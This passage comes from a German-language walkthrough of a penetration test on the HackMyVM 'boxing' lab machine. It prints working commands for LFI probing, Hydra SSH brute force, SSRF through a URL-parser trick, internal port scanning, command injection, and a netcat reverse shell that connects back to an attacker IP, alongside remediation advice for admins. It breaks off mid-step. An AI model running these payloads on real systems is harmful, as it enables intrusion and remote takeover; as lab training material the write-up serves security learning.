+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Origin: http://192.168.2.114
+Connection: close
+Referer: http://192.168.2.114/feedback.php
+Upgrade-Insecure-Requests: 1</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Ein GET-Request wird an `/feedback.php` gesendet, wobei versucht wird, den `feedback`-Parameter für eine LFI mit dem `php://filter`-Wrapper zu nutzen, um den Base64-kodierten Quellcode von `feedback.php` selbst zu erhalten.</p>
+            <p class="evaluation">**Bewertung:** Zeigt einen korrekten Ansatz zum Auslesen von Quellcode mittels LFI. Das Ergebnis dieser Anfrage ist jedoch nicht im Log dokumentiert, daher ist der Erfolg unbekannt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führe diesen Request aus und analysiere die Antwort. Wenn Base64-Text zurückkommt, dekodiere ihn, um den Quellcode zu erhalten.
+            <br>**Empfehlung (Admin):** Behebe die potenzielle LFI-Schwachstelle, falls vorhanden.</p>
+
+        </section>
+
+        <section id="staging-environment-analysis">
+             <h2>Staging Environment Analysis</h2>
+             <p class="comment">Hinweise auf eine Staging-Umgebung und einen potenziellen Benutzernamen/Passwort-Hinweis.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Befehl, sondern interpretierte Informationen/Notizen -->
+                    <pre>
+http://boxing.hmv/
+
+demo@boxing.hmv
+X-Origin-Domain = staging-env.boxing.hmv</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Befehl, sondern interpretierte Informationen/Notizen -->
+                    <pre>
+http://boxing.hmv/feedback.php?feedback=Hello%21+You+don%27t+have+a+link+to+reset+the+password%2C+and+I%27ve+forgotten+it%21+I+tried+Cassius%21+but+it+doesn%27t+work%3B+Contact+me+asap+pease%21%0D%0A%0D%0ACassius</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Diese Blöcke scheinen Notizen oder zusammengefasste Informationen zu sein:
+             <ul>
+                <li>Es wurde eine E-Mail-Adresse `demo@boxing.hmv` und ein HTTP-Header `X-Origin-Domain: staging-env.boxing.hmv` gefunden, die auf eine Subdomain/Staging-Umgebung hinweisen.</li>
+                <li>Eine (möglicherweise fiktive) Feedback-Nachricht enthält den Text "I tried Cassius! but it doesn't work". Dies ist ein starker Hinweis auf "Cassius!" als mögliches (falsches oder richtiges) Passwort.</li>
+             </ul></p>
+            <p class="evaluation">**Bewertung:** Hoch. Die Entdeckung der Staging-Umgebung `staging-env.boxing.hmv` eröffnet eine neue Angriffsfläche. Der Passwort-Hinweis "Cassius!" ist sehr relevant.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Füge `staging-env.boxing.hmv` zur `/etc/hosts`-Datei hinzu und beginne mit der Enumeration dieser Umgebung. Teste "Cassius!" als Passwort für gefundene Benutzer (z.B. `daro`, `cassius`).
+            <br>**Empfehlung (Admin):** Sichere oder entferne die Staging-Umgebung. Stelle sicher, dass keine sensiblen Hinweise (wie Passwörter) in öffentlich zugänglichen Bereichen oder Nachrichten hinterlassen werden.</p>
+
+            <p class="comment">Erste Enumeration der Staging-Umgebung mit Gobuster.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Befehl, sondern Gobuster-Ausgabe für Staging -->
+                    <pre>
+http://staging-env.boxing.hmv/index.php            (Status: 200) [Size: 1167]
+http://staging-env.boxing.hmv/cache                (Status: 301) [Size: 332] [--> http://staging-env.boxing.hmv/cache/]</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein (hier nicht gezeigter) Gobuster-Scan gegen `http://staging-env.boxing.hmv` findet `index.php` und ein Verzeichnis `/cache/`.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt, dass die Staging-Umgebung aktiv ist und eine andere Struktur als die Produktionsumgebung haben könnte. Das `/cache/`-Verzeichnis ist potenziell interessant.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuche `index.php` auf der Staging-Umgebung und den Inhalt von `/cache/`.
+            <br>**Empfehlung (Admin):** Überprüfe die Sicherheit und Notwendigkeit der Staging-Umgebung.</p>
+
+             <p class="comment">Analyse von Cache-Dateien und einer Hash-Signatur (vermutlich aus dem `/cache/`-Verzeichnis).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">cat 707971e003b4ae6c8121c3a920e507f5-le64.cache-8</span></div>
+                     <pre>
+��@`����c�:�-/usr/share/fonts/X11/encoding/usr/share/fonts/X11/encodings/large</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">strings 707971e003b4ae6c8121c3a920e507f5-le64.cache-8</span></div>
+                     <pre>
+/usr/share/fonts/X11/encodings
+/usr/share/fonts/X11/encodings/large</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">strings data_block.bin</span></div>
+                     <pre>
+Vs?d
+7m8k*
+UEzY
+~)>q
+a>GW?
+%_h+?1
+q!fj
+wm^G
+P;nV
+A6&amp;wfrak&amp;]
+bPy9</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~cyber/Downloads] <!-- Pfadfehler im Log -->
+└─# <span class="command">cat CACHEDIR.TAG</span></div>
+                     <pre>
+Signature: 8a477f597d28d172789f06886806bc55
+# This file is a cache directory tag created by man-db.
+# For information about cache directory tags, see:
+#	http://www.brynosaurus.com/cachedir/</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, sondern Ergebnis einer Online-Hash-Suche -->
+                    <pre>
+Enter up to 20 non-salted hashes, one per line:
+8a477f597d28d172789f06886806bc55
+
+Supports: LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults
+Hash	Type	Result
+8a477f597d28d172789f06886806bc55	Unknown	Not found.</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Es werden verschiedene Dateien untersucht, die vermutlich aus dem `/cache/`-Verzeichnis der Staging-Umgebung stammen:
+            <ul>
+                <li>Eine Cache-Datei (`*.cache-8`) enthält Pfade zu X11-Font-Encodings.</li>
+                <li>Eine Datei `data_block.bin` enthält anscheinend zufällige Zeichenketten oder Binärdatenfragmente.</li>
+                <li>Eine Datei `CACHEDIR.TAG` enthält eine Signatur (Hash) und einen Kommentar, der sie als Cache-Tag von `man-db` (Linux Manual Page Database) identifiziert.</li>
+                <li>Der Versuch, die Signatur-Hash (`8a477f...`) online zu suchen/knacken, schlägt fehl.</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Niedrig. Die untersuchten Cache-Dateien scheinen keine direkt verwertbaren Informationen oder Zugangsdaten zu enthalten. Die `CACHEDIR.TAG`-Datei ist Standard für `man-db` und die Signatur ist kein Passwort-Hash.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das `/cache/`-Verzeichnis scheint keine wertvollen Informationen zu enthalten. Konzentriere dich auf die `index.php` der Staging-Umgebung.
+            <br>**Empfehlung (Admin):** Stelle sicher, dass keine sensiblen Daten im Cache-Verzeichnis landen.</p>
+
+            <p class="comment">Versuch, LFI auf der Staging-Umgebung (`index.php`) über den `url`-Parameter zu nutzen.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Befehl, sondern Beschreibung einer Browser-Aktion -->
+                    <pre>view-source:http://staging-env.boxing.hmv/index.php?url=/etc/passwd</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Es wird versucht, die Datei `/etc/passwd` über den `url`-Parameter der `index.php` auf der Staging-Umgebung einzubinden. Das Ergebnis (ob der Inhalt angezeigt wurde) ist im Log nicht ersichtlich.</p>
+            <p class="evaluation">**Bewertung:** Dokumentiert einen LFI-Versuch. Erfolg unklar aus dem Log.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Überprüfe die Antwort des Servers auf diesen Request, um die LFI zu bestätigen.
+            <br>**Empfehlung (Admin):** Behebe die LFI im `url`-Parameter der Staging-`index.php`.</p>
+
+            <p class="comment">Fuzzing nach LFI-Parametern auf der Staging-`index.php` bestätigt den `url`-Parameter.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://staging-env.boxing.hmv/index.php?FUZZ=../../../../../../etc/passwd" --hc 404 --hh 1167</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+* Crowd sourced tool Collaboration community...        *
+********************************************************
+
+Target: http://staging-env.boxing.hmv/index.php?FUZZ=../../../../../../etc/passwd
+Total requests: 220546
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000001257:   200        46 L     93 W       1184 Ch     "url"
+
+=====================================================================
+
+Total time: 138.1204
+Processed Requests: 220546
+Filtered Requests: 220545
+Requests/sec.: 1596.765</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** `wfuzz` wird verwendet, um Parameter zu finden, die für LFI anfällig sind, indem der Payload `../../../../../../etc/passwd` getestet wird. Es filtert Antworten mit Status 404 oder der Standard-Zeichengröße (1167) heraus. Der einzige gefundene Parameter ist `url`, der eine andere Antwortgröße (1184 Zeichen) erzeugt.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt, dass der `url`-Parameter in `staging-env.boxing.hmv/index.php` der LFI-anfällige Parameter ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutze `?url=` für LFI- und SSRF-Angriffe auf die Staging-Umgebung.
+            <br>**Empfehlung (Admin):** Behebe die LFI im `url`-Parameter dringend.</p>
+
+ 
+
+             <p class="comment">Fehlgeschlagener SQLMap-Scan gegen die Staging-Umgebung.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/ben.sql --dbs --batch --risk 3 --level 3</span></div>
+                     <pre>
+___
+__H__
+ ___ ___[']_____ ___ ___  {1.8.4#stable}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:05:12 /2024-04-28/
+
+[23:05:12] [INFO] parsing HTTP request from '/home/cyber/Downloads/ben.sql'
+[23:05:12] [INFO] testing connection to the target URL
+[23:05:12] [INFO] checking if the target is protected by some kind of WAF/IPS
+[23:05:12] [INFO] testing if the target URL content is stable
+[23:05:12] [INFO] target URL content is stable
+[23:05:12] [INFO] testing if GET parameter 'url' is dynamic
+[23:05:12] [INFO] confirming that GET parameter 'url' is dynamic
+[23:05:12] [INFO] GET parameter 'url' is dynamic
+[23:05:12] [INFO] heuristic (basic) test shows that GET parameter 'url' might be injectable (possible DBMS: 'MySQL')
+[23:05:12] [INFO] testing for SQL injection on GET parameter 'url'
+# ... (viele fehlgeschlagene Tests) ...
+[23:05:12] [WARNING] parameter 'Referer' does not seem to be injectable
+[23:05:12] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+
+[*] ending @ 23:05:12 /2024-04-28/</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** `sqlmap` wird erneut ausgeführt, diesmal vermutlich mit einer Anfrage an `staging-env.boxing.hmv/index.php` (gespeichert in `ben.sql`). Trotz intensiver Tests (`--level 3 --risk 3`) findet `sqlmap` keine SQL-Injection-Schwachstelle im `url`-Parameter oder anderen Parametern der Anfrage.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. SQLi ist auch auf der Staging-Umgebung unwahrscheinlich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konzentriere dich auf LFI/SSRF im `url`-Parameter der Staging-Umgebung.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+        </section>
+
+       <section id="ssrf-and-rce">
+            <h2>SSRF and RCE via Staging</h2>
+
+            <p class="comment">Nutzung der LFI/SSRF auf Staging, um die Produktionsseite abzurufen und Benutzernamen zu extrahieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Befehl, sondern Beschreibung der Aktion und des Ergebnisses -->
+                    <pre>
+http://staging-env.boxing.hmv/index.php?url=boxing.hmv
+
+http://boxing.hmv/images/
+Jone Moe Boxer
+Joniya Daro
+Lio Uji</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die LFI-Schwachstelle im `url`-Parameter von `staging-env.boxing.hmv/index.php` wird genutzt, um eine Server-Side Request Forgery (SSRF)-Anfrage an die Produktions-URL `boxing.hmv` zu senden. Der Staging-Server ruft die Hauptseite ab. Aus dem Inhalt (vermutlich aus dem `/images/`-Verzeichnis, wie angegeben) werden drei Namen extrahiert: "Jone Moe Boxer", "Joniya Daro", "Lio Uji". Diese könnten Benutzernamen sein (`moe`, `daro`, `uji`).</p>
+            <p class="evaluation">**Bewertung:** Kritisch. Die LFI ermöglicht SSRF, was zur Offenlegung potenzieller Benutzernamen führt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuche SSH-Logins mit diesen Benutzernamen (`moe`, `daro`, `uji`) und dem Passwort-Hinweis "Cassius!" oder mittels Brute-Force. Nutze SSRF weiter, um interne Dienste zu scannen.
+            <br>**Empfehlung (Admin):** Behebe die LFI/SSRF-Schwachstelle auf dem Staging-Server. Entferne oder sichere die Staging-Umgebung.</p>
+
+            <p class="comment">Fehlgeschlagene Hydra SSH-Brute-Force-Versuche für die gefundenen Benutzernamen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l moe -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.114:22 -t 64</span></div>
+                     <pre><!-- Keine Ausgabe gezeigt, vermutlich fehlgeschlagen/abgebrochen --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l uji -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.114:22 -t 64</span></div>
+                     <pre><!-- Keine Ausgabe gezeigt, vermutlich fehlgeschlagen/abgebrochen --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l Joniya -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.114:22 -t 64</span></div>
+                     <pre><!-- Keine Ausgabe gezeigt, vermutlich fehlgeschlagen/abgebrochen --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l daro -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.114:22 -t 64</span></div>
+                     <pre><!-- Keine Ausgabe gezeigt, vermutlich fehlgeschlagen/abgebrochen --></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Es werden vier Hydra-Befehle ausgeführt (oder zumindest vorbereitet), um SSH-Passwörter für die Benutzer `moe`, `uji`, `Joniya` und `daro` mit der `rockyou.txt`-Wordlist zu knacken. Da keine Erfolgsmeldungen gezeigt werden, ist anzunehmen, dass diese Versuche fehlschlugen oder abgebrochen wurden.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Die über SSRF gefundenen Benutzernamen scheinen keine schwachen Passwörter aus `rockyou.txt` für SSH zu verwenden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuche den Passwort-Hinweis "Cassius!" oder "Cassius!123" (aus dem späteren Hash-Crack). Konzentriere dich ansonsten wieder auf SSRF/RCE.
+            <br>**Empfehlung (Admin):** Starke Passwörter und SSH-Härtung sind wichtig.</p>
+
+            <p class="comment">Nutzung von SSRF zur Kontaktaufnahme mit dem HTTP-Server des Angreifers.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@192.168.2.199'</span></div>
+                     <pre><!-- Keine Ausgabe von curl gezeigt --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.2.114 - - [28/Apr/2024 23:36:36] "GET / HTTP/1.1" 200 -</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Die SSRF-Schwachstelle im `url`-Parameter wird genutzt, um den Staging-Server eine Anfrage an den Angreifer-Host senden zu lassen. Der Payload `boxing.hmv@192.168.2.199` im `url`-Parameter veranlasst den Server (vermutlich durch einen Fehler im URL-Parser der Anwendung), eine Anfrage an `192.168.2.199` zu senden. Der auf dem Angreifer-Host laufende Python-HTTP-Server empfängt diese Anfrage von der IP des Zielservers (192.168.2.114).</p>
+            <p class="evaluation">**Bewertung:** Bestätigt, dass SSRF genutzt werden kann, um Verbindungen vom Staging-Server zu externen (oder internen) IPs herzustellen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutze dies für interne Portscans (`url=localhost:PORT`) oder zum Zugriff auf interne Dienste.
+            <br>**Empfehlung (Admin):** Behebe die SSRF-Schwachstelle. Implementiere Egress-Filterung auf dem Staging-Server, um ausgehende Verbindungen zu beschränken.</p>
+
+            <p class="comment">Interner Portscan auf `localhost` (des Staging-Servers) mittels SSRF und `ffuf`.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ffuf -u 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:FUZZ' -w &lt;(seq 1 65000) -fs 1167</span></div>
+                     <pre>
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:FUZZ
+ :: Wordlist         : FUZZ: /dev/stdin
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 1167 (-fs)
+________________________________________________
+
+80                      [Status: 200, Size: 25021, Words: 10556, Lines: 702, Duration: 847ms]
+5000                    [Status: 200, Size: 2367, Words: 828, Lines: 96, Duration: 3ms]</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** `ffuf` wird genutzt, um über die SSRF-Schwachstelle einen Portscan auf `localhost` (aus Sicht des Staging-Servers) durchzuführen. Es iteriert durch die Ports 1 bis 65000 (`-w <(seq 1 65000)`). Antworten mit der Standardgröße 1167 werden ignoriert (`-fs 1167`). Zwei Ports liefern abweichende Antworten: Port 80 (Apache der Hauptseite) und Port 5000.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreicher interner Portscan via SSRF. Ein bisher unbekannter Dienst auf `localhost:5000` wurde entdeckt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuche den Dienst auf Port 5000 über die SSRF: `curl 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000'`.
+            <br>**Empfehlung (Admin):** Behebe die SSRF. Identifiziere und sichere den Dienst auf Port 5000 oder deaktiviere ihn, falls nicht benötigt.</p>
+
+            <p class="comment">Zugriff auf den internen Dienst auf Port 5000 via SSRF.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000'</span></div>
+                     <pre>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;!-- Head-Inhalt ausgelassen --&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method="post"&gt;
+        Process name: &lt;input type="text" name="processName" placeholder="Type process"&gt;
+        &lt;input type="submit"&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der `curl`-Befehl nutzt die SSRF, um auf `localhost:5000` zuzugreifen. Die Antwort ist eine einfache HTML-Seite mit einem Formular, das nach einem "Process name" fragt und einen Submit-Button hat. Das Formular sendet die Daten per POST an sich selbst (`/`).</p>
+            <p class="evaluation">**Bewertung:** Ein interner Webdienst wurde gefunden, der Benutzereingaben entgegennimmt und vermutlich zur Prozessinteraktion dient. Dies ist eine hochgradig verdächtige Funktionalität.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Teste dieses Formular auf Command Injection. Sende Prozessnamen (z.B. `id`, `ls`, `ps`) oder versuche, durch spezielle Zeichen (`|`, `;`, `` ` ``) Befehle anzuhängen.
+            <br>**Empfehlung (Admin):** Untersuche diesen Dienst auf Port 5000 sofort. Solch eine Funktionalität (Ausführen von Prozessen über eine Weboberfläche) ist extrem gefährlich und sollte, wenn überhaupt, nur mit stärkster Authentifizierung und Eingabevalidierung existieren. Deaktiviere ihn, falls möglich.</p>
+
+            <p class="comment">Erster Command Injection Test auf Port 5000 (mit GET statt POST).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000?processName=id'</span></div>
+                     <pre>
+
+    &lt;form method="post"&gt;
+        Process name: &lt;input type="text" name="processName" placeholder="Type process"&gt;
+        &lt;input type="submit"&gt;
+    &lt;/form&gt;
+
+&lt;div class='output'&gt;&lt;pre&gt;Linux 6.1.0-17-amd64 (boxing) 	28/04/2024 	_x86_64_	(1 CPU)
+
+23:47:53      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
+&lt;/pre&gt;&lt;/div&gt;&lt;/body&gt;
+&lt;/html&gt;</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Es wird versucht, den `processName`-Parameter über einen GET-Request (als Teil der SSRF-URL) mit dem Wert `id` zu senden. Der Server antwortet jedoch mit einer Ausgabe, die wie eine Prozessliste oder Systemübersicht aussieht (`Linux ... UID PID ...`), aber nicht mit der direkten Ausgabe des `id`-Befehls. Das Formular verwendet POST, daher ist die Übergabe als GET-Parameter möglicherweise nicht die korrekte Methode, oder die Anwendung interpretiert die Eingabe anders als erwartet.</p>
+            <p class="evaluation">**Bewertung:** Zeigt, dass die Eingabe eine Reaktion auslöst, aber keine direkte Command Injection im einfachen Sinne. Die Anwendung scheint die Eingabe in einen Befehl zur Prozessanzeige (wie `ps`, `top` oder `sar`) einzubetten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fuzzing des `processName`-Parameters mit speziellen Zeichen, um zu sehen, ob die Syntax des Backend-Befehls gebrochen werden kann. Versuche, den Request als POST zu senden, falls das über SSRF möglich ist (oft schwierig).
+            <br>**Empfehlung (Admin):** Untersuche und sichere den Backend-Code, der den `processName`-Parameter verarbeitet.</p>
+
+            <p class="comment">Fuzzing des `processName`-Parameters mit Sonderzeichen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Shell-Befehl, sondern Notiz -->
+                    <pre>
+I got a list of special characters from
+https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ffuf -u 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000?processName=asdFUZZ-eFUZZid' -w specialchars.txt -fs 2548</span></div>
+                     <pre>
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000?processName=asdFUZZ-eFUZZid
+ :: Wordlist         : FUZZ: specialchars.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 2548 (-fs)
+________________________________________________
+
++                       [Status: 200, Size: 1167, Words: 395, Lines: 47, Duration: 20ms]</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, sondern Notiz zur URL-Kodierung -->
+                    <pre>
+https://www.urlencoder.org/
++ = %2B</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Es wird `ffuf` verwendet, um Sonderzeichen aus einer Liste (`specialchars.txt`) in den `processName`-Parameter einzufügen (`processName=asdFUZZ-eFUZZid`). Antworten mit der Größe 2548 werden herausgefiltert. Das einzige Zeichen, das eine abweichende Antwort (Größe 1167) erzeugt, ist das Pluszeichen (`+`). Es wird korrekt angemerkt, dass `+` in URLs oft als Leerzeichen interpretiert wird, aber auch URL-kodiert als `%2B` gesendet werden kann.</p>
+            <p class="evaluation">**Bewertung:** Wichtiger Hinweis. Das `+`-Zeichen scheint die Backend-Verarbeitung zu stören oder anders zu beeinflussen als andere Zeichen. Dies ist der Schlüssel zur möglichen Command Injection.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konstruiere einen Payload, der das `+`-Zeichen (URL-kodiert als `%2B`) nutzt, um einen Befehl einzuschleusen. Beispiel: `processName=beliebigerText%2B-e%2Bbefehl`.
+            <br>**Empfehlung (Admin):** Untersuche, warum das `+`-Zeichen die Verarbeitung beeinflusst, und implementiere eine robuste Sanitisierung/Validierung.</p>
+
+            <p class="comment">Erfolgreicher Command Injection Test mit URL-kodiertem Pluszeichen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000?processName=system%2B-e%2Bid'</span></div>
+                     <pre>
+
+    &lt;form method="post"&gt;
+        Process name: &lt;input type="text" name="processName" placeholder="Type process"&gt;
+        &lt;input type="submit"&gt;
+    &lt;/form&gt;
+
+&lt;div class='output'&gt;&lt;pre&gt;Linux 6.1.0-17-amd64 (boxing) 	28/04/2024 	_x86_64_	(1 CPU)
+uid=33(www-data) gid=33(www-data) groupes=33(www-data)
+&lt;/pre&gt;&lt;/div&gt;&lt;/body&gt;
+&lt;/html&gt;</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der `curl`-Befehl sendet den Payload `processName=system%2B-e%2Bid` via SSRF an den internen Dienst. Der Payload `system+-e+id` wird offenbar vom Backend so interpretiert, dass der `id`-Befehl ausgeführt wird. Die Ausgabe `uid=33(www-data)...` erscheint im HTML der Antwort.</p>
+            <p class="evaluation">**Bewertung:** Kritisch! Remote Code Execution als `www-data` auf dem Host-System (wo der Port 5000 Dienst läuft) ist bestätigt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutze diese RCE, um eine Reverse Shell zu bekommen.
+            <br>**Empfehlung (Admin):** **Dringend:** Behebe die Command Injection und die SSRF-Schwachstelle.</p>
+
+            <p class="comment">Aufbau einer Reverse Shell mittels der RCE-Schwachstelle.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4445</span></div> <!-- Port geändert zu 6666 im nächsten Schritt -->
+                     <pre>listening on [any] 4445 ...</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000?processName=system%2B-e%2Bnc%2B-c%2Bbash%2B192.168.2.199%2B6666'</span></div> <!-- Ziel-Port ist 6666 -->
+                     <pre><!-- Keine Ausgabe von curl erwartet --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 6666</span></div> <!-- Korrekter Listener-Port -->
+                     <pre>
+listening on [any] 6666 ...
